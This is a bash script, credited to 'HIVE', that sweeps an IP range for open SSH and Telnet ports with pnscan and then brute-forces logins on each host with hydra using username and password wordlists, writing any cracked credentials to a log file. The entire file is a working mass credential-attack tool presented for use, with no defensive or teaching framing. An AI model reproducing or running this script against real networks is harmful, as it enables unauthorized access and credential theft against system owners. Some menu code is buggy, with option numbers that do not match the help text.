#!/bin/bash
#Author: HIVE
#Port numbers
port=22;port1=23;
#Used to make the ip address
per=.
#Creates log file
echo log > login.log
#default start ip is 192.168.0.1
startA=192;startB=168;startC=0;startD=1;
#default end ip is 192.168.0.255
endA=192;endB=168;endC=0;endD=255;
#Default word lists
userFile=user.txt
passFile=pass.txt
#Default number of tasks for hydra
tasks=4
#Checks to see if hyrda left a restore file and if it is 
#foun ir deletes it
if ls | grep -q 'hydra.restore';then
	rm -r hydra.restore;
fi
#Sets all the variables to there default settings
setDefault() {
	#default start ip is 192.168.0.1
	startA=192;startB=168;startC=0;startD=1;
	#default end ip is 192.168.0.255
	endA=192;endB=168;endC=0;endD=255;
	#Default word lists
	userFile=user.txt
	passFile=pass.txt
	#Default number of tasks for hydra
	tasks=4
}
#Prints out name of the author
ad() {
	clear
	
	echo -e '\n\n\033[0;35m'
	echo '         ╔╗────╔╗'
	echo '         ║║╔═╦═╬╬═╦╗'
	echo '         ║╚╣╬║╬║║║║║'
	echo '         ╚═╩═╬╗╠╩╩═╝'
	echo '         ────╚═╝'
	echo -e '\033[0m      Brought to you by'
	echo -e '\033[1;33m'
	echo '   ░█─░█ ▀█▀ ░█──░█ ░█▀▀▀'
	echo '   ░█▀▀█ ░█─ ─░█░█─ ░█▀▀▀' 
	echo '   ░█─░█ ▄█▄ ──▀▄▀─ ░█▄▄▄' 
	echo '            ____'
	echo '           /    \'
	echo '      ____/      \____'
	echo '     /    \      /    \'
	echo '    /      \____/      \'
	echo '    \      /    \      /'
	echo '     \____/      \____/'
	echo '     /    \      /    \'
	echo '    /      \____/      \'
	echo '    \      /    \      /'
	echo '     \____/      \____/'
	echo '          \      /'
	echo -e '           \____/\033[0m'
	sleep 2
}
#Prints out the name of the program
login() {
	clear
	echo -e '\033[0;35m'
	echo '      ╔╗'
	echo '      ║║'
	echo '      ║║──╔══╦══╦╦═╗'
	echo '      ║║─╔╣╔╗║╔╗╠╣╔╗╗'
	echo '      ║╚═╝║╚╝║╚╝║║║║║'
	echo '      ╚═══╩══╩═╗╠╩╝╚╝'
	echo '      ───────╔═╝║'
	echo '      ───────╚══╝'
	echo -e '\033[0m'
}
#This function is called by the check function. This tries to brute
#force the login for the current ip address through telnet
#This logs information into the login.log file which is where all of the
#found logins can be found
loginTelnet() {
	echo $ip trying to login via telnet
	if (( $restore==0 ));then
		hydra -v -V -o login.log -f -e nsr -s $port1 -L $userFile -P $passFile -t $tasks $ip telnet
	fi
}
#This function is called by the check function. This tries to brute
#force the login for the current ip address through ssh
#This logs information into the login.log file which is where all of the
#found logins can be found
loginSSH() {
	echo $ip trying to login via ssh
	if (( $restore==0 ));then
		hydra -v -V -o login.log -f -e nsr -s $port -L $userFile -P $passFile -t $tasks $ip ssh
	fi
}
#This function checks if the current ip address has either port 22
#or port 23 open. If the ip address has one of those ports open it 
#calls its corresponding function 
check() {
	ip=$1
	if pnscan $ip $port | grep -q $port; then
		echo -e '\033[0;32m$ip\033[0m port $port open'
		loginSSH
	elif pnscan $ip $port1 | grep -q $port1; then
		echo -e '\033[0;32m$ip\033[0m port $port1 open'
		loginTelnet
	else
		pkill -9 pnscan
		echo -e "\033[0;31m$ip\033[0m"
	fi
}
#The main loop and what the program goes to when the user 
#chooses the run option on the main function
#This function makes the ip address go up one every time
#the loop goes through and when it hits the end ip address
#it stops
mainLoop() {
	echo 'Checking the addresses for open ports...'
	for (( A=$startA; A<=$endA; A++ ))
	do
		for (( B=$startB; B<=$endB; B++ ))
		do
			for (( C=$startC; C<=$endC; C++ ))
			do
				for (( D=$startD; D<=$endD; D++ ))
				do
					ip=$A$per$B$per$C$per$D
					check $ip
				done
			done
		done
	done
}
#Sets the ip address to start at from what the user entered
getStart() {
	ip=$1
	IFS=. read ip1 ip2 ip3 ip4 <<< "$ip"
	startA=$ip1;startB=$ip2;startC=$ip3;startD=$ip4
}
#Sets the ip address to end at from what the user entered
getEnd() {
	ip=$1
	IFS=. read ip1 ip2 ip3 ip4 <<< "$ip"
	endA=$ip1;endB=$ip2;endC=$ip3;endD=$ip4
}
#Used to set ip addresses
setIp() {
	echo -ne '\033[0;35mEnter ip to start at\033[0m: '
	read startIp
	echo -ne '\033[0;035mEnter ip to end at\033[0m: ' 
	read endIp
	getStart $startIp
	getEnd $endIp
}
#Sets the number of tasks for hydra
setTasks() {
	echo -ne 'Enter the number of tasks for hydra(Default=4): ' 
	read -enteredTask
	tasks=$enteredTask
}
#Shows all of the variables that have been set
show() {
	echo ''
	echo -e '\e[4mVariables\e[0m'
	echo 'Start ip address: '$startA$per$startB$per$startC$per$startD
	echo 'End ip address:   '$endA$per$endB$per$endC$per$endD
	echo 'Hydra tasks:      '$tasks
	echo "Word lists:        $userFile $passFile"
	echo ''
}
#Sets the usernames word list
setUser() {
	echo -ne  '\033[0;035mEnter path to username word list\033[0m: '
	read username
	userFile=$username
}
#Sets the passwords word list
setPass() {
	echo -ne '\033[0;35mEnter path to password word list\033[0m: ' 
	read password
	passFile=$password
}
#Sets one word list for both username and passwords
setOneBoth() {
	echo -ne '\033[0;35mEnter path to word list\033[0m: ' 
	read wordListPath
	userFile=$wordListPath
	passFile=$wordListPath
}
#Gives the user options for setting word lists
#The word lists are used for hydra
setWordLists() {
	login
	echo -e '          \e[4mOptions\e[0m'
	echo '(1) Set username word list'
	echo '(2) Set password word list'
	echo '(3) Set one list for both'
	echo '(4) Set both with different lists'
	echo '(5) Exit'
	echo -e '\e[1mEnter the number of the option you want\e[0m'
	echo ''
	echo -ne '\033[0;35mLogin\033[0m: '
	read op
	if (( $op == 1 ));then
		setUser;clear
	elif (( $op == 2 ));then
		setPass;clear
	elif (( $op == 3 ));then
		setOneBoth;clear
	elif (( $op == 4 ));then
		setUser;
		setPass;clear
	elif (( $op == 5 )) || [ '$op' == 'exit' ];then
		clear;exit
	else #If the user enters something other then what is listed the user
	     #is returned to the begining of this function
		clear;setWordLists;
	fi
}
#Gives you options to choose from
options() {
	login;
	echo -e '           \e[4mOptions\e[0m'
	echo '(1) Set default settings' 
	echo '(2) Set ip address'
	echo '(3) Set number of tasks for hydra'
	echo '(4) Show current set variables'
	echo '(5) Set word lists'
	echo '(6) Run the program with the set variables'
	echo '(7) Help (Show this list)'
	echo '(8) Exit'
	echo -e '\e[1mEnter the number of the option you want\e[0m'
	echo ''
}
#Runs a function based on the option
#that the user choses
main() {
	echo -ne '\033[0;35mLogin\033[0m: ' 
	read option
	#If an option is entered other then run the user will be returned 
	#to the begining of this function
	if (( $option == 1 ));then	
		setDefault;
		main;
	elif (( $option == 2 ));then
		setIp;
		main;
	elif (( $option == 3 ));then
		setTasks;
		main;
	elif (( $option == 4 )) || [ "$option" == "show" ];then
		show;
		main;
	elif (( $option == 5 ));then
		setWordLists;
		main;
	elif (( $option == 6 )) || [ "$option" == "run" ];then
		login;
		mainLoop;
	elif (( $option == 7 )) || [ "$option" == "Exit" ] || [ "$option" == "exit" ];then
		exit
	elif [ "$option" == "help" ] || [ "$option" == "Help" ] || (( $option == 8 ));then
		options;
		main;
	else #If the user enters something that isnt an option it 
	     #goes back to the begining of this function
		echo -e "\033[0;31m$option is not valid\033[0m"
		main;
	fi
}
ad;
options;
main;
